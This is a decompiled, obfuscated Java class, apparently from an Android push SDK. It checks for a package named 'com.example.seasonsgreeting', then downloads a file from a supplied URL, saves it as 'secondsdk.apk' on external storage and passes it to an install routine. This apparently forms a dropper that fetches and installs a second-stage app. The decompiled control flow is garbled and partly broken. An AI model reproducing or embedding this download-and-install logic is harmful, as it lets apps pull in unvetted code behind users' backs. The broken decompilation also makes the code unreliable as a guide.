package com.push2.sdk.util;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class f
{
  boolean a = true;
  File b;
  private String c = "File";
  private Context d;
  
  public f(Context paramContext)
  {
    this.d = paramContext;
  }
  
  private boolean b(String paramString)
  {
    PackageManager localPackageManager = this.d.getPackageManager();
    try
    {
      localPackageManager.getPackageInfo(paramString, 1);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramString) {}
    return false;
  }
  
  public void a(String paramString)
  {
    Object localObject;
    if (!b("com.example.seasonsgreeting")) {
      localObject = new d(this.d);
    }
    try
    {
      this.a = ((d)localObject).a();
      if (this.a)
      {
        paramString = (HttpURLConnection)new URL(paramString).openConnection();
        paramString.connect();
        localObject = paramString.getInputStream();
        this.b = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/install/");
        if (!this.b.exists()) {
          this.b.mkdir();
        }
        String str = Environment.getExternalStorageDirectory().getAbsolutePath() + "/install/" + "secondsdk.apk";
        localFileOutputStream = new FileOutputStream(new File(str));
        arrayOfByte = new byte['Ð€'];
        i = ((InputStream)localObject).read(arrayOfByte);
        if (i == -1)
        {
          o.a(str, this.d.getApplicationContext());
          paramString.disconnect();
          localFileOutputStream.close();
          ((InputStream)localObject).close();
        }
      }
      else
      {
        return;
      }
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        FileOutputStream localFileOutputStream;
        byte[] arrayOfByte;
        int i;
        localIOException.printStackTrace();
        continue;
        localFileOutputStream.write(arrayOfByte, 0, i);
      }
    }
  }
}
